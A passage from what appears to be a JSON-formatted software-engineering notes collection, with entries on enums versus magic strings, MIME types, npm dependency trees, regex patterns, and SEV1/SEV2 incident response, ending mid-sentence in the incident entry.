Numeric Enums\n\n```typescript\nenum LogLevel {\n  ERROR = 0,\n  WARN = 1,\n  INFO = 2,\n  DEBUG = 3\n}\n\nfunction log(level: LogLevel, message: string) {\n  if (level <= LogLevel.WARN) {\n    console.error(message);\n  }\n}\n\nlog(LogLevel.ERROR, \"Critical issue\");\n```\n\n### Const Enums (No Runtime Code)\n\n```typescript\n// Regular enum - generates JavaScript code\nenum Color {\n  RED = \"red\",\n  BLUE = \"blue\"\n}\n\n// Const enum - inlined at compile time, no JS code\nconst enum Color {\n  RED = \"red\",\n  BLUE = \"blue\"\n}\n\n// Compiled output:\n// Regular: Creates Color object\n// Const: Just replaces Color.RED with \"red\"\n```\n\n## JavaScript Alternatives to Enums\n\n### Object.freeze\n\n```javascript\n// Prevent modification\nconst USER_ROLES = Object.freeze({\n  ADMIN: \"admin\",\n  USER: \"user\",\n  GUEST: \"guest\"\n});\n\nUSER_ROLES.ADMIN = \"something\";  // Silently fails (strict mode: error)\nconsole.log(USER_ROLES.ADMIN);   // Still \"admin\"\n```\n\n### Symbols (Unique Values)\n\n```javascript\n// Guaranteed unique\nconst STATUS = {\n  PENDING: Symbol(\"pending\"),\n  DONE: Symbol(\"done\")\n};\n\nconst task = { status: STATUS.PENDING };\n\n// Can't accidentally match\ntask.status === STATUS.PENDING;  // ✅ true\ntask.status === \"pending\";       // ❌ false (Symbol vs String)\n```\n\n## When to Use What\n\n```javascript\n// ✅ Constants: Simple values, config\nconst MAX_RETRIES = 3;\nconst API_URL = \"https://api.example.com\";\n\n// ✅ Object Constants: Related string values\nconst COLORS = {\n  PRIMARY: \"#007bff\",\n  DANGER: \"#dc3545\"\n};\n\n// ✅ Enums (TypeScript): Type-safe states\nenum UserRole {\n  ADMIN = \"admin\",\n  USER = \"user\"\n}\n\n// ✅ Symbols: Truly unique values\nconst STATUS = {\n  INIT: Symbol(\"init\"),\n  READY: Symbol(\"ready\")\n};\n```\n\n## Common Patterns\n\n### Validation\n\n```javascript\nconst ORDER_STATUS = {\n  PENDING: \"pending\",\n  PROCESSING: \"processing\",\n  SHIPPED: \"shipped\"\n};\n\nfunction isValidStatus(status) {\n  return Object.values(ORDER_STATUS).includes(status);\n}\n\nisValidStatus(\"pending\");     // true\nisValidStatus(\"invalid\");     // false\n```\n\n### Switch Statements\n\n```javascript\nfunction getStatusColor(status) {\n  switch (status) {\n    case ORDER_STATUS.PENDING:\n      return \"yellow\";\n    case ORDER_STATUS.PROCESSING:\n      return \"blue\";\n    case ORDER_STATUS.SHIPPED:\n      return \"green\";\n    default:\n      return \"gray\";\n  }\n}\n```\n\n### React Props\n\n```javascript\nconst BUTTON_VARIANTS = {\n  PRIMARY: \"primary\",\n  SECONDARY: \"secondary\",\n  DANGER: \"danger\"\n};\n\nfunction Button({ variant = BUTTON_VARIANTS.PRIMARY, children }) {\n  return (\n    <button className={`btn-${variant}`}>\n      {children}\n    </button>\n  );\n}\n\n// Usage\n<Button variant={BUTTON_VARIANTS.PRIMARY}>Save</Button>\n```\n\n## Migration Strategy\n\n```javascript\n// Step 1: Define constants\nconst USER_ROLES = {\n  ADMIN: \"admin\",\n  USER: \"user\"\n};\n\n// Step 2: Replace gradually\n// Before:\nif (user.role === \"admin\") { }\n\n// After:\nif (user.role === USER_ROLES.ADMIN) { }\n\n// Step 3: Search codebase for remaining magic strings\n// Search for: \"admin\" (in quotes)\n// Replace with: USER_ROLES.ADMIN\n```\n\n## File Organization\n\n```javascript\n// constants/userRoles.js\nexport const USER_ROLES = {\n  ADMIN: \"admin\",\n  USER: \"user\",\n  GUEST: \"guest\"\n};\n\n// constants/orderStatus.js\nexport const ORDER_STATUS = {\n  PENDING: \"pending\",\n  PROCESSING: \"processing\",\n  SHIPPED: \"shipped\"\n};\n\n// constants/index.js\nexport * from \"./userRoles\";\nexport * from \"./orderStatus\";\n\n// Usage\nimport { USER_ROLES, ORDER_STATUS } from \"./constants\";\n```\n\n## References\n\n- [TypeScript Enums](https://www.typescriptlang.org/docs/handbook/enums.html)\n- [Magic Numbers](https://en.wikipedia.org/wiki/Magic_number_(programming))\n- [Clean Code Principles](https://www.amazon.com/Clean-Code-Handbook-Software-Craftsmanship/dp/0132350882)\n\n---\n\n## Summary\n\n**Magic Strings:** Hard-coded literals (`\"admin\"`, `404`) scattered in code.\n\n**Problems:** Typo-prone, hard to maintain, no IDE support, unclear meaning.\n\n**Solutions:**\n- **Constants:** `const MAX_USERS = 100`\n- **Object Constants:** `USER_ROLES.ADMIN`\n- **Enums (TypeScript):** `enum UserRole { ADMIN = \"admin\" }`\n\n**Rule of thumb:** If a literal appears more than once or has special meaning, make it a constant. If it's a set of related values, use object constants or enums.\n\n**Quick fix:** Search codebase for quoted strings, replace with named constants."
    },
    {
      "id": "swe/misc/mime-type-issues",
      "title": "MIME Type Issues",
      "path": [
        "swe",
        "misc",
        "mime-type-issues"
      ],
      "content": "# MIME Type Issues\n\nMIME (Multipurpose Internet Mail Extensions) types are used to specify the nature and format of a file or data transmitted over the internet. Correct MIME type handling is crucial for web applications, APIs, and file transfers.\n\n## Content-Type Header and MIME Types\n\nThe `Content-Type` HTTP header is used to indicate the MIME type of the resource being sent or received. It tells the client or server how to interpret the data in the body of the HTTP message.\n\n- **Format:** `Content-Type: <type>/<subtype>; charset=UTF-8`\n- **Examples:**\n  - `Content-Type: text/html; charset=UTF-8`\n  - `Content-Type: application/json`\n  - `Content-Type: image/png`\n\n### Relationship Between Content-Type and MIME Types\n\nMIME types are the values used in the `Content-Type` header. For example, when a server sends a JSON response, it should set `Content-Type: application/json` so the client knows to parse the body as JSON.\n\n### Why Content-Type Matters\n\n- **Correct Rendering:** Browsers and clients use the `Content-Type` to render or process content appropriately.\n- **Security:** Setting the correct `Content-Type` can prevent security issues, such as cross-site scripting (XSS) attacks.\n- **Interoperability:** APIs and web services rely on `Content-Type` for proper communication between different systems.\n\n### Common Content-Type Values\n\n- `text/plain` — Plain text\n- `text/html` — HTML documents\n- `application/json` — JSON data\n- `application/xml` — XML data\n- `multipart/form-data` — Used for file uploads\n- `application/octet-stream` — Binary data\n\n## Common MIME Type Issues\n\n- **Incorrect MIME Type Assignment**: Serving files with the wrong MIME type can cause browsers or clients to misinterpret the content (e.g., serving a JSON file as `text/plain` instead of `application/json`).\n- **Missing MIME Type**: If a server omits the MIME type header, clients may guess the type, leading to unpredictable behavior.\n- **Security Risks**: Incorrect MIME types can expose applications to security vulnerabilities, such as XSS attacks when HTML is served as plain text.\n- **File Upload/Download Problems**: Applications may reject or mishandle files if the MIME type does not match the expected format.\n\n## Best Practices\n\n- Always set the correct MIME type for files and API responses.\n- Validate MIME types on file uploads to prevent malicious content.\n- Use server configuration (e.g., Apache, Nginx) to enforce proper MIME type mapping.\n- Test file handling in different browsers and clients to ensure compatibility.\n\n## Useful Resources\n\n- [MDN Web Docs: MIME types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types)\n- [OWASP: MIME Type Security](https://owasp.org/www-community/vulnerabilities/MIME_type_mismatch)\n\n---\n\n_See journal entry for 2025-08-19 for related experience._\n"
    },
    {
      "id": "swe/misc/package-managers/npm-dependency-tree",
      "title": "NPM Dependency Trees: Complete Overview",
      "path": [
        "swe",
        "misc",
        "package-managers",
        "npm-dependency-tree"
      ],
      "content": "# NPM Dependency Trees: Complete Overview\n\nNPM dependency trees show the hierarchical structure of packages your project depends on, including nested dependencies (dependencies of dependencies). Running `npm ls` displays this tree, revealing which packages are installed and how they relate. Think of it like a family tree—your direct dependencies are your children, their dependencies are grandchildren, and so on down multiple generations.\n\n## Key Points\n\n- **Dependency Tree:** Hierarchical structure of all packages and their dependencies\n- **Direct Dependencies:** Packages listed in your `package.json`\n- **Transitive Dependencies:** Dependencies of your dependencies\n- **npm ls:** Command to view dependency tree\n- **node_modules:** Flat structure on disk, but logical tree in npm\n\n## Basic Concepts\n\n### Direct vs Transitive Dependencies\n\n```json\n// package.json\n{\n  \"dependencies\": {\n    \"express\": \"^4.18.0\",      // Direct dependency\n    \"lodash\": \"^4.17.21\"       // Direct dependency\n  }\n}\n\n// Dependency tree\nyour-app\n├── express@4.18.0            // Direct\n│   ├── body-parser@1.20.0    // Transitive (express's dependency)\n│   ├── cookie@0.5.0          // Transitive\n│   └── debug@2.6.9           // Transitive\n│       └── ms@2.0.0          // Transitive (debug's dependency)\n└── lodash@4.17.21            // Direct\n```\n\n### Viewing the Tree\n\n```bash\n# Full tree (all levels)\nnpm ls\n\n# Limit depth\nnpm ls --depth=0      # Only direct dependencies\nnpm ls --depth=1      # Direct + one level down\nnpm ls --depth=2      # Two levels down\n\n# Specific package\nnpm ls express        # Where is express used?\nnpm ls lodash         # Show lodash and its dependents\n\n# Production only (no devDependencies)\nnpm ls --prod\nnpm ls --production\n\n# Show all versions (even duplicates)\nnpm ls --all\n```\n\n## Understanding the Output\n\n### Basic Tree\n\n```bash\nnpm ls --depth=1\n\nmy-app@1.0.0\n├── express@4.18.0\n│   ├── accepts@1.3.8\n│   ├── array-flatten@1.1.1\n│   └── body-parser@1.20.0\n├── lodash@4.17.21\n└── react@18.2.0\n    ├── loose-envify@1.4.0\n    └── scheduler@0.23.0\n```\n\n**Reading the tree:**\n```\n├── Direct dependency (top level)\n│   ├── Transitive dependency (nested)\n│   └── Another transitive dependency\n└── Last direct dependency\n    └── Its dependency\n```\n\n### Deduplication\n\n```bash\n# Before deduplication\napp\n├── package-a@1.0.0\n│   └── lodash@4.17.21\n└── package-b@1.0.0\n    └── lodash@4.17.21    # Duplicate!\n\n# After npm install (deduplicated)\napp\n├── package-a@1.0.0\n│   └── lodash@4.17.21 deduped\n├── package-b@1.0.0\n│   └── lodash@4.17.21 deduped\n└── lodash@4.17.21    # Hoisted to top level\n\n# \"deduped\" means it uses the top-level version\n```\n\n### Version Conflicts\n\n```bash\n# Different versions needed\napp\n├── package-a@1.0.0\n│   └── lodash@4.17.21\n├── package-b@1.0.0\n│   └── lodash@3.10.1    # Different version required!\n└── lodash@4.17.21       # Hoisted (most common version)\n\n# package-a uses top-level lodash@4.17.21\n# package-b gets its own lodash@3.10.1 nested\n```\n\n## Common Commands\n\n### Find Package Location\n\n```bash\n# Where is a package in the tree?\nnpm ls express\n\n# Output\nmy-app@1.0.0\n└── express@4.18.0\n\n# Why is this package installed?\nnpm why lodash\n\n# Output (shows all paths to lodash)\nlodash@4.17.21\nnode_modules/lodash\n  lodash@\"^4.17.21\" from the root project\n\n# Find all versions of a package\nnpm ls lodash --all\n\n# Output\nmy-app@1.0.0\n├─┬ package-a@1.0.0\n│ └── lodash@4.17.21 deduped\n├─┬ package-b@2.0.0\n│ └── lodash@3.10.1\n└── lodash@4.17.21\n```\n\n### Check for Issues\n\n```bash\n# List missing dependencies\nnpm ls\n# Shows UNMET DEPENDENCY if something missing\n\n# List extraneous packages\nnpm ls --parseable --depth=0 | grep -v node_modules\n# Shows packages in node_modules not in package.json\n\n# Check for vulnerabilities\nnpm audit\nnpm audit --production  # Only prod dependencies\n```\n\n## Dependency Types\n\n### dependencies\n\n```json\n{\n  \"dependencies\": {\n    \"express\": \"^4.18.0\"\n  }\n}\n```\n**Used:** Production runtime\n**Installed:** `npm install` (always)\n\n### devDependencies\n\n```json\n{\n  \"devDependencies\": {\n    \"jest\": \"^29.0.0\",\n    \"eslint\": \"^8.0.0\"\n  }\n}\n```\n**Used:** Development/testing only\n**Installed:** `npm install` (only if not `--production`)\n\n### peerDependencies\n\n```json\n{\n  \"peerDependencies\": {\n    \"react\": \"^18.0.0\"\n  }\n}\n```\n**Used:** Package requires this to be installed by parent\n**Example:** React plugin needs React installed\n\n### optionalDependencies\n\n```json\n{\n  \"optionalDependencies\": {\n    \"fsevents\": \"^2.3.0\"\n  }\n}\n```\n**Used:** Package works without it, but better with it\n**Install fails:** Doesn't break installation\n\n## Understanding node_modules Structure\n\n### Flat vs Nested\n\n```bash\n# Old npm (< v3): Nested structure\nnode_modules/\n├── express/\n│   └── node_modules/\n│       ├── body-parser/\n│       │   └── node_modules/\n│       │       └── debug/\n│       └── cookie/\n└── lodash/\n\n# Modern npm (v3+): Flat structure\nnode_modules/\n├── express/\n├── body-parser/    # Hoisted to top level\n├── debug/          # Hoisted\n├── cookie/         # Hoisted\n└── lodash/\n\n# Benefits: Smaller disk usage, faster installs\n```\n\n### Hoisting Rules\n\n```\nnpm hoists dependencies to highest possible level\n\nExample:\napp needs express@4.18.0\nexpress needs body-parser@1.20.0\n\nResult:\nnode_modules/\n├── express/\n└── body-parser/  ← Hoisted to top (no version conflict)\n\nIf version conflict:\napp needs body-parser@1.19.0\nexpress needs body-parser@1.20.0\n\nResult:\nnode_modules/\n├── express/\n│   └── node_modules/\n│       └── body-parser/  ← 1.20.0 (stays nested)\n├── body-parser/  ← 1.19.0 (top level, direct dependency)\n```\n\n## Troubleshooting\n\n### Duplicate Dependencies\n\n```bash\n# Find duplicates\nnpm ls lodash\n\n# If multiple versions shown:\napp\n├─┬ package-a\n│ └── lodash@4.17.21\n├─┬ package-b\n│ └── lodash@4.17.20\n└── lodash@4.17.21\n\n# Fix: Deduplicate\nnpm dedupe\n\n# Or update to align versions\nnpm update lodash\n```\n\n### Missing Peer Dependencies\n\n```bash\nnpm ls\n\n# Warning shown:\nnpm WARN eslint-plugin-react@7.28.0 requires a peer of eslint@^3 || ^4 || ^5 || ^6 || ^7 || ^8\nbut none is installed. You must install peer dependencies yourself.\n\n# Fix: Install the peer dependency\nnpm install eslint@^8.0.0\n```\n\n### Phantom Dependencies\n\n```bash\n# package.json doesn't list 'lodash'\n# But code uses it because transitive dependency\n\n// app.js\nimport _ from 'lodash';  // Works but dangerous!\n\n# Problem: If transitive dependency stops using lodash,\n# your code breaks\n\n# Fix: Add explicit dependency\nnpm install lodash\n```\n\n### Conflicting Versions\n\n```bash\nnpm ls debug\n\n# Shows multiple versions\napp\n├─┬ package-a\n│ └── debug@4.3.0\n├─┬ package-b\n│ └── debug@2.6.9    # Old version\n└── debug@4.3.0\n\n# Fix: Try to update package-b\nnpm update package-b\n\n# Or override (package-lock.json)\n{\n  \"overrides\": {\n    \"debug\": \"^4.3.0\"\n  }\n}\n```\n\n## Analyzing Bundle Size\n\n```bash\n# See what contributes to bundle size\nnpm ls --depth=0 --long\n\n# Use tools\nnpx npm-consider install <package>  # Before installing\nnpm-bundle-size <package>            # Check size\n\n# Visualize dependencies\nnpx webpack-bundle-analyzer\nnpx source-map-explorer bundle.js\n```\n\n## Package-lock.json Role\n\n```json\n// package-lock.json stores exact tree\n{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\",\n  \"lockfileVersion\": 2,\n  \"requires\": true,\n  \"packages\": {\n    \"\": {\n      \"dependencies\": {\n        \"express\": \"^4.18.0\"\n      }\n    },\n    \"node_modules/express\": {\n      \"version\": \"4.18.0\",\n      \"resolved\": \"https://registry.npmjs.org/express/-/express-4.18.0.tgz\",\n      \"dependencies\": {\n        \"body-parser\": \"1.20.0\"\n      }\n    },\n    \"node_modules/body-parser\": {\n      \"version\": \"1.20.0\",\n      \"resolved\": \"https://...\"\n    }\n  }\n}\n```\n\n**Purpose:**\n- Lock exact versions of entire tree\n- Ensure reproducible installs\n- Faster installs (knows exact versions)\n\n## Best Practices\n\n```bash\n# ✅ Keep dependencies minimal\n# Only install what you need\n\n# ✅ Use exact versions for critical packages\n{\n  \"dependencies\": {\n    \"critical-package\": \"1.2.3\"  // No ^ or ~\n  }\n}\n\n# ✅ Audit regularly\nnpm audit\nnpm audit fix\n\n# ✅ Update dependencies\nnpm outdated              # Check for updates\nnpm update               # Update within semver range\nnpm update --latest      # Update to latest (ignores semver)\n\n# ✅ Check bundle size before adding\nnpx npm-consider install lodash\n\n# ✅ Use production flag for deployment\nnpm install --production\n# Skips devDependencies\n\n# ❌ Don't commit node_modules\n# Add to .gitignore\n\n# ❌ Don't use global packages in projects\nnpm install -g package    # ❌ Global\nnpm install package       # ✅ Local\n\n# ❌ Don't manually edit node_modules\n# Changes lost on next install\n```\n\n## Common Patterns\n\n### Monorepo Dependencies\n\n```bash\n# Workspaces (npm 7+)\nmy-monorepo/\n├── package.json\n├── packages/\n│   ├── app/\n│   │   └── package.json\n│   └── shared/\n│       └── package.json\n\n# Root package.json\n{\n  \"workspaces\": [\n    \"packages/*\"\n  ]\n}\n\n# Install all workspace dependencies\nnpm install\n\n# Tree shows workspace links\nmy-monorepo\n├── app -> ./packages/app\n├── shared -> ./packages/shared\n└── (shared dependencies hoisted to root)\n```\n\n### Scoped Packages\n\n```bash\n# @scope/package format\nnpm install @babel/core\nnpm install @types/react\n\n# Tree\napp\n├── @babel/core\n│   └── @babel/parser\n└── @types/react\n```\n\n## Debugging Tips\n\n```bash\n# Verbose output\nnpm ls --depth=0 --long\n\n# JSON output (for scripting)\nnpm ls --json --depth=0\n\n# Check specific dependency path\nnpm ls --depth=10 | grep -A 5 package-name\n\n# Find why package installed\nnpm why package-name\n\n# List all files in package\nnpm ls --parseable\n\n# Check for circular dependencies\nnpm ls --json | grep -C 3 \"circular\"\n```\n\n## References\n\n- [npm-ls Documentation](https://docs.npmjs.com/cli/v8/commands/npm-ls)\n- [npm Dependency Resolution](https://docs.npmjs.com/cli/v8/configuring-npm/package-json#dependencies)\n- [package-lock.json](https://docs.npmjs.com/cli/v8/configuring-npm/package-lock-json)\n\n---\n\n## Summary\n\n**Dependency Tree:** Hierarchical view of all packages and their dependencies.\n\n**Key Commands:**\n```bash\nnpm ls                    # View full tree\nnpm ls --depth=0         # Direct dependencies only\nnpm ls package-name      # Find specific package\nnpm why package-name     # Why is it installed\nnpm dedupe              # Remove duplicates\n```\n\n**Structure:**\n- Direct dependencies (in package.json)\n- Transitive dependencies (dependencies of dependencies)\n- Hoisted to top level when possible\n- Nested when version conflicts exist\n\n**Common Issues:**\n- Duplicate packages → `npm dedupe`\n- Missing peers → Install manually\n- Outdated packages → `npm update`\n\n**Rule of thumb:** Run `npm ls --depth=0` to see direct dependencies. Use `npm ls package-name` to find where specific packages come from. Keep tree shallow and dependencies minimal."
    },
    {
      "id": "swe/misc/regex",
      "title": "Popular Regex Expressions: A Well-Structured Overview",
      "path": [
        "swe",
        "misc",
        "regex"
      ],
      "content": "# Popular Regex Expressions: A Well-Structured Overview\n\nRegular expressions (regex) are pattern-matching strings used to search, validate, and manipulate text, providing powerful text processing capabilities across programming languages and tools.\n\n## Key Points\n\n- **Definition:** Sequence of characters defining search patterns for string matching, validation, and extraction operations.\n- **Metacharacters:** Special characters like `.`, `*`, `+`, `?`, `[]`, `()`, `^`, `$` have special pattern-matching meanings.\n- **Character Classes:** Predefined shortcuts—`\\d` (digits), `\\w` (word characters), `\\s` (whitespace)—simplify common patterns.\n- **Quantifiers:** Control repetition—`*` (0+), `+` (1+), `?` (0-1), `{n}` (exactly n), `{n,m}` (n to m times).\n- **Anchors:** `^` (start of string) and `$` (end of string) constrain matching position.\n- **Flags:** Modifiers like `i` (case-insensitive), `g` (global), `m` (multiline) change behavior.\n- **Use Cases:** Email/phone validation, data extraction, find-and-replace, URL parsing, form validation.\n\n## Fundamental Regex Characters\n\n**Basic Metacharacters**\n```javascript\n// . (dot) - matches any single character except newline\n/a.c/.test('abc');     // true (dot matches 'b')\n/a.c/.test('a*c');     // true (dot matches '*')\n/a.c/.test('ac');      // false (dot requires one character)\n\n// * - matches 0 or more of preceding character\n/ab*c/.test('ac');     // true (0 b's)\n/ab*c/.test('abc');    // true (1 b)\n/ab*c/.test('abbbbc'); // true (many b's)\n\n// + - matches 1 or more of preceding character\n/ab+c/.test('ac');     // false (requires at least 1 b)\n/ab+c/.test('abc');    // true (1 b)\n/ab+c/.test('abbc');   // true (2+ b's)\n\n// ? - matches 0 or 1 of preceding character (optional)\n/colou?r/.test('color');  // true (0 u's)\n/colou?r/.test('colour'); // true (1 u)\n\n// ^ - start of string anchor\n/^hello/.test('hello world'); // true (starts with hello)\n/^hello/.test('say hello');   // false (doesn't start with hello)\n\n// $ - end of string anchor\n/world$/.test('hello world'); // true (ends with world)\n/world$/.test('world peace'); // false (doesn't end with world)\n\n// | - alternation (OR)\n/cat|dog/.test('cat');    // true\n/cat|dog/.test('dog');    // true\n/cat|dog/.test('bird');   // false\n\n// \\ - escape special characters\n/\\./.test('.');           // true (matches literal dot)\n/\\*/.test('*');           // true (matches literal asterisk)\n```\n\n**Character Classes**\n```javascript\n// [] - character set (match any one character inside)\n/[abc]/.test('a');        // true\n/[abc]/.test('b');        // true\n/[abc]/.test('d');        // false\n\n// [^] - negated set (match anything NOT inside)\n/[^abc]/.test('d');       // true\n/[^abc]/.test('a');       // false\n\n// [a-z] - range\n/[a-z]/.test('m');        // true (lowercase letters)\n/[0-9]/.test('5');        // true (digits)\n/[A-Za-z0-9]/.test('K');  // true (alphanumeric)\n\n// \\d - digit [0-9]\n/\\d/.test('5');           // true\n/\\d/.test('a');           // false\n\n// \\D - non-digit [^0-9]\n/\\D/.test('a');           // true\n/\\D/.test('5');           // false\n\n// \\w - word character [A-Za-z0-9_]\n/\\w/.test('a');           // true\n/\\w/.test('_');           // true\n/\\w/.test('$');           // false\n\n// \\W - non-word character [^A-Za-z0-9_]\n/\\W/.test('$');           // true\n/\\W/.test('a');           // false\n\n// \\s - whitespace (space, tab, newline)\n/\\s/.test(' ');           // true\n/\\s/.test('\\t');          // true\n/\\s/.test('a');           // false\n\n// \\S - non-whitespace\n/\\S/.test('a');           // true\n/\\S/.test(' ');           // false\n```\n\n**Quantifiers**\n```javascript\n// {n} - exactly n times\n/\\d{3}/.test('123');      // true (exactly 3 digits)\n/\\d{3}/.test('12');       // false (only 2 digits)\n\n// {n,} - n or more times\n/\\d{2,}/.test('12');      // true (2+ digits)\n/\\d{2,}/.test('12345');   // true (5 digits)\n\n// {n,m} - between n and m times\n/\\d{2,4}/.test('12');     // true (2 digits)\n/\\d{2,4}/.test('12345');  // true (matches first 4)\n/\\d{2,4}/.test('1');      // false (only 1 digit)\n```\n\n**Groups and Capture**\n```javascript\n// () - capturing group\nconst match = '123-456'.match(/(\\d+)-(\\d+)/);\n// match[1] = '123'\n// match[2] = '456'\n\n// (?:) - non-capturing group\n/(?:ab)+/.test('ababab'); // true (groups 'ab', doesn't capture)\n\n// \\1, \\2 - backreferences to captured groups\n/(\\w)\\1/.test('aa');      // true (same character twice)\n/(\\w)\\1/.test('ab');      // false (different characters)\n```\n\n**Lookahead/Lookbehind**\n```javascript\n// (?=) - positive lookahead (assert what follows)\n/\\d(?=px)/.test('10px');  // true (digit followed by 'px')\n/\\d(?=px)/.test('10em');  // false\n\n// (?!) - negative lookahead (assert what doesn't follow)\n/\\d(?!px)/.test('10em');  // true (digit NOT followed by 'px')\n/\\d(?!px)/.test('10px');  // false\n\n// (?<=) - positive lookbehind (assert what precedes)\n/(?<=\\$)\\d+/.test('$50'); // true (digits preceded by $)\n/(?<=\\$)\\d+/.test('50');  // false\n\n// (?<!) - negative lookbehind (assert what doesn't precede)\n/(?<!\\$)\\d+/.test('50');  // true (digits NOT preceded by $)\n/(?<!\\$)\\d+/.test('$50'); // false\n```\n\n## Common Regex Patterns\n\n**Email Validation**\n```javascript\n/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test('user@example.com');  // true\n```\n\n**Phone Number (US)**\n```javascript\n/^\\(?(\\d{3})\\)?[-.\\s]?(\\d{3})[-.\\s]?(\\d{4})$/.test('555-123-4567');  // true\n```\n\n**URL**\n```javascript\n/https?:\\/\\/[^\\s]+$/.test('https://example.com');  // true\n```\n\n**Password (8+ chars, uppercase, lowercase, digit, special)**\n```javascript\n/^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])[A-Za-z\\d@$!%*?&]{8,}$/\n  .test('Strong123!');  // true\n```\n\n**Date (MM/DD/YYYY)**\n```javascript\n/^(0[1-9]|1[0-2])[/-](0[1-9]|[12]\\d|3[01])[/-]\\d{4}$/\n  .test('12/31/2024');  // true\n```\n\n**Username (3-16 chars, alphanumeric + underscore)**\n```javascript\n/^[a-zA-Z0-9_]{3,16}$/.test('user_123');  // true\n```\n\n**IPv4 Address**\n```javascript\n/^((25[0-5]|2[0-4]\\d|1\\d{2}|[1-9]?\\d)\\.){3}(25[0-5]|2[0-4]\\d|1\\d{2}|[1-9]?\\d)$/\n  .test('192.168.1.1');  // true\n```\n\n**Credit Card (with optional separators)**\n```javascript\n/^(\\d{4}[-\\s]?){3}\\d{4}$/.test('1234-5678-9012-3456');  // true\n```\n\n## Common Pitfalls\n\n- Forgetting to escape metacharacters—use `\\.` for literal dot, `\\*` for asterisk.\n- Using greedy quantifiers—`.*` matches maximum, use `.*?` for minimal match.\n- Not anchoring patterns—without `^` and `$`, matches anywhere in string.\n- Over-complicating—simple validation often better than perfect but unreadable regex.\n- Missing edge cases—test empty strings, special characters, extreme lengths.\n- Performance issues—complex patterns with backtracking can be catastrophically slow.\n- Wrong flags—remember `i` (case-insensitive), `g` (global), `m` (multiline).\n\n## Practical Applications\n\n- **Form Validation:** Email, phone, password strength checks.\n- **Data Extraction:** Parse logs, extract URLs, phone numbers from text.\n- **Search/Replace:** Find and modify patterns in editors and scripts.\n- **URL Routing:** Match route patterns in web frameworks.\n\n## References\n\n- [MDN Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)\n- [Regex101 (Testing Tool)](https://regex101.com/)\n- [RegExr (Interactive)](https://regexr.com/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Named Capture Groups:** `(?<name>...)` for readable references—`match.groups.name`.\n- **Non-Greedy Quantifiers:** `*?`, `+?`, `??` match minimum instead of maximum.\n- **Word Boundaries:** `\\b` matches position between word/non-word character.\n- **Unicode Support:** `\\p{L}` (letters), `\\p{N}` (numbers) with `u` flag.\n- **Atomic Groups:** `(?>...)` prevent backtracking for performance.\n- **Case-Insensitive Flag:** `/pattern/i` ignores case.\n- **Global Flag:** `/pattern/g` finds all matches, not just first.\n- **Multiline Flag:** `/pattern/m` makes `^` and `$` match line boundaries.\n- **Testing Tools:** Regex101 and RegExr visualize patterns and provide explanations.\n- **Performance:** Avoid nested quantifiers and catastrophic backtracking with atomic groups."
    },
    {
      "id": "swe/misc/sev1-sev2",
      "title": "SEV1/SEV2 Incidents: A Well-Structured Overview",
      "path": [
        "swe",
        "misc",
        "sev1-sev2"
      ],
      "content": "# SEV1/SEV2 Incidents: A Well-Structured Overview\n\nSEV1 and SEV2 incidents are critical system outages or degradations that require immediate response, following structured escalation processes to restore service quickly while maintaining communication with stakeholders.\n\n## Key Points\n\n- **Definition:** Severity-based classification system for production incidents, where SEV1 is most critical (complete outage) and SEV2 is high priority (major degradation).\n- **SEV1 Criteria:** Complete service outage, data loss, security breach, or issues affecting all users with significant business impact.\n- **SEV2 Criteria:** Partial service degradation, significant performance issues, or problems affecting subset of users with moderate business impact.\n- **Response Time:** SEV1 requires immediate response (minutes), SEV2 requires urgent response (within 1 hour).\n- **Incident Command:** Structured roles including Incident Commander, Communications Lead, and Technical Lead coordinate response.\n- **War Room:** Dedicated channel (Slack, Zoom) where responders collaborate in real-time during active incident.\n- **Postmortem:** Blameless retrospective analyzing root cause, timeline, and prevention measures after resolution.\n\n## Step-by-Step Explanation & Examples\n\n**Incident Severity Classification**\n```\nSEV1 (Critical - P1 Priority)\n├─ Complete service outage affecting all users\n├─ Data loss or corruption impacting customer data\n├─ Security breach or unauthorized access\n├─ Payment processing completely down\n├─ SLA breach with contractual penalties\n└─ Response: Immediate (within 5-15 minutes)\n\nSEV2 (High - P2 Priority)\n├─ Significant performance degradation (>50% slowdown)\n├─ Major feature unavailable (login works, checkout broken)\n├─ Affecting specific region or user segment\n├─ Elevated error rates (>5% of requests failing)\n├─ Critical third-party integration down\n└─ Response: Urgent (within 30-60 minutes)\n\nSEV3 (Medium - P3 Priority)\n├─ Minor feature degradation\n├─ Affecting small percentage of users\n└─ Response: Next business day\n\nSEV4 (Low - P4 Priority)\n├─ Cosmetic issues, minor bugs\n└─ Response: Planned sprint work\n```\n\n**Incident Response Process**\n```bash\n# 1. DETECTION & DECLARATION\n# Alert fires from monitoring (PagerDuty, Datadog, CloudWatch)\n# On-call engineer acknowledges within 5 minutes\n\n# 2. DECLARE INCIDENT\n# Create incident in management tool\nincident create --severity=sev1 --title=\"API gateway returning 503 errors\"\n\n# 3. ASSEMBLE RESPONSE TEAM\n# Incident Commander (IC): Coordinates response, makes decisions\n# Technical Lead (TL): Drives technical investigation and fixes\n# Communications Lead (CL): Updates stakeholders, customers, status page\n# Subject Matter Experts (SMEs): Database, networking, security specialists as needed\n\n# 4. ESTABLISH WAR ROOM\n# Create dedicated Slack channel: #incident-2024-11-03-api-outage\n# Start Zoom bridge for voice communication\n# Pin key links: dashboards, runbooks, status page\n\n# 5. INITIAL ASSESSMENT (First 10 minutes)\nTTD: Time to Detect - When did issue start?\nTTR: Time to Respond - When did team engage?\nImpact: How many users/requests affected?\nScope: Which services/regions impacted?\n\n# 6. INVESTIGATION & MITIGATION\n# Follow runbooks, check recent deployments\n# Example commands during investigation:\nkubectl get pods -n production  # Check pod health\naws cloudwatch get-metric-statistics  # Check metrics\ngit log --since=\"1 hour ago\"  # Recent changes\n\n# 7. STATUS UPDATES (Every 15-30 minutes)\n# Communications Lead posts to:\n# - Internal Slack channel\n# - Status page (status.company.com)\n# - Customer support team\n# - Executive stakeholders\n\n# 8. RESOLUTION\n# Incident Commander declares \"all clear\"\n# Monitor for 15-30 minutes to confirm stability\n# Update status page: \"Issue resolved\"\n\n# 9. POSTMORTEM (Within 48 hours)\n# Write blameless incident report covering:\n# - Timeline of events\n# - Root cause analysis (RCA)\n# - Impact assessment\n# - Action items to prevent 